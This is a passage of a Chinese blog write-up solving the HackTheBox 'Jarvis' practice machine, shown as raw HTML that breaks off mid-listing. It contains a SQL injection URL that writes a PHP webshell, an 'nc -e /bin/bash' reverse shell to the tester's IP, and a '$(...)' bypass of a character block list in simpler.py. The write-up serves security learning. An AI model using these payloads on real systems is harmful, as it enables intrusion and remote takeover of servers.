@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Jarvis - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="HackTheBox">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;194  10.10.10.143                                                                                                              端口扫描需要全端口，有一个64999(不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jarvis - HackTheBox">
+<meta property="og:url" content="https://darkwing.moe/2020/02/11/Jarvis-HackTheBox/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;194  10.10.10.143                                                                                                              端口扫描需要全端口，有一个64999(不">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010701.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010702.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010703.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010704.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010705.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010706.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010707.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010708.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010709.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010710.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010711.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010712.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010713.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010714.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010715.jpg">
+<meta property="article:published_time" content="2020-02-11T06:36:46.000Z">
+<meta property="article:modified_time" content="2021-01-07T06:37:59.690Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010701.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                彼女募集中
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://darkwing.moe/2015/01/01/%E4%B9%A6%E5%8D%95/"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Jarvis - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Jarvis - HackTheBox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-11T06:36:46.000Z" itemprop="datePublished" class="page-time">
+  2020-02-11
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-143"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.143</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#64999"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">64999</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#SQL注入"><span class="post-toc-number">3.</span> <span class="post-toc-text">SQL注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sqli-to-webshell"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">sqli to webshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#reverse-shell"><span class="post-toc-number">4.</span> <span class="post-toc-text">reverse shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-number">5.</span> <span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#命令注入"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">命令注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#simpler-py"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">simpler.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#pepper-shell"><span class="post-toc-number">6.</span> <span class="post-toc-text">pepper shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh-key"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">ssh key</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#miao-sh"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">miao.sh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">7.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">8.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#miao-service"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">miao.service</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">9.</span> <span class="post-toc-text">提权 &amp; root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">10.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Jarvis-HackTheBox"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Jarvis - HackTheBox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-11 14:36:46" datetime="2020-02-11T06:36:46.000Z"  itemprop="datePublished">2020-02-11</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
+<li><p><a href="https://www.hackthebox.eu/home/machines/profile/194" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/194</a></p>
+</li>
+<li><h2 id="10-10-10-143"><a href="#10-10-10-143" class="headerlink" title="10.10.10.143"></a>10.10.10.143</h2></li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口，有一个64999(不过也没怎么用到这个端口)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- --min-rate=1000 10.10.10.143</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 13:19 CST</span><br><span class="line">Nmap scan report for 10.10.10.143</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">80/tcp    open     http</span><br><span class="line">45505/tcp filtered unknown</span><br><span class="line">64999/tcp open     unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1008.70 seconds</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -p 22,80,64999 10.10.10.143</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 13:19 CST</span><br><span class="line">Nmap scan report for 10.10.10.143</span><br><span class="line">Host is up (0.082s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">64999/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个hotel：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="64999"><a href="#64999" class="headerlink" title="64999"></a>64999</h2><p>直接访问显示banned 90秒：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>80的web很基础的sql注入：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="sqli-to-webshell"><a href="#sqli-to-webshell" class="headerlink" title="sqli to webshell"></a>sqli to webshell</h2><p>load_file,into outfile 读写文件，直接写wbeshell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.143&#x2F;room.php?cod&#x3D;-1 union select 1,&#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;,3,4,5,6,7 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;miao.php&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h1><p>服务器有nc，直接reverse shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.143&#x2F;miao.php?cmd&#x3D;nc -e &#x2F;bin&#x2F;bash 10.10.14.7 4445</span><br><span class="line"></span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>当前是www-data用户，sudo -l显示可以无密码以pepper身份执行/var/www/Admin-Utilities/simpler.py：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>查看这个文件，里面有一个exec_ping函数调用了system，command是我们输入的，有简单的过滤：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br></pre></td></tr></table></figure>
+
+<p>但可以使用<code>$(cmd)</code>这种方式执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line"></span><br><span class="line">Enter an IP: $(whoami).test.com</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021010709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="simpler-py"><a href="#simpler-py" class="headerlink" title="simpler.py"></a>simpler.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_help</span><span class="params">()</span>:</span></span><br><span class="line">    message=<span class="string">'''</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Simpler   -   A simple simplifier ;)                 *</span></span><br><span class="line"><span class="string">* Version 1.0                                          *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">Usage:  python3 simpler.py [options]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h/--help   : This help</span></span><br><span class="line"><span class="string">    -s          : Statistics</span></span><br><span class="line"><span class="string">    -l          : List the attackers IP</span></span><br><span class="line"><span class="string">    -p          : ping an attacker IP</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_header</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'''***********************************************</span></span><br><span class="line"><span class="string">     _                 _</span></span><br><span class="line"><span class="string"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span></span><br><span class="line"><span class="string">/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |</span></span><br><span class="line"><span class="string">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span></span><br><span class="line"><span class="string">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span></span><br><span class="line"><span class="string">                |_|               |_|    |___/</span></span><br><span class="line"><span class="string">                                @ironhackers.es</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">***********************************************</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_statistics</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    print(<span class="string">'Statistics\n-----------'</span>)</span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    count = len(listed_files)</span><br><span class="line">    print(<span class="string">'Number of Attackers: '</span> + str(count))</span><br><span class="line">    level_1 = <span class="number">0</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">    ip_list = []</span><br><span class="line">    reks = []</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req = <span class="string">''</span></span><br><span class="line">    rek = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i, <span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level2, rek = get_max_level(lines)</span><br><span class="line">        fecha, requ = date_to_num(lines)</span><br><span class="line">        ip = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> fecha &gt; dat:</span><br><span class="line">            dat = fecha</span><br><span class="line">            req = requ</span><br><span class="line">            ip2 = i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> int(level2) &gt; int(level_1):</span><br><span class="line">            level_1 = level2</span><br><span class="line">            ip_list = [ip]</span><br><span class="line">            reks=[rek]</span><br><span class="line">        <span class="keyword">elif</span> int(level2) == int(level_1):</span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">            reks.append(rek)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Risky:'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(ip_list) &gt; <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'More than 1 ip found'</span>)</span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        print(<span class="string">'    '</span> + i + <span class="string">' - Attack Level : '</span> + level_1 + <span class="string">' Request: '</span> + reks[cont])</span><br><span class="line">        cont = cont + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Most Recent: '</span> + ip2 + <span class="string">' --&gt; '</span> + str(dat) + <span class="string">' '</span> + req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_ip</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Attackers\n-----------'</span>)</span><br><span class="line">    path = <span class="string">'/home/pepper/Web/Logs/'</span></span><br><span class="line">    listed_files = listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> listed_files:</span><br><span class="line">        f = open(path + i,<span class="string">'r'</span>)</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        level,req = get_max_level(lines)</span><br><span class="line">        print(i.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span> + i.split(<span class="string">'.'</span>)[<span class="number">3</span>] + <span class="string">' - Attack Level : '</span> + level)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">date_to_num</span><span class="params">(lines)</span>:</span></span><br><span class="line">    dat = datetime(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    ip = <span class="string">''</span></span><br><span class="line">    req=<span class="string">''</span></span><br><span 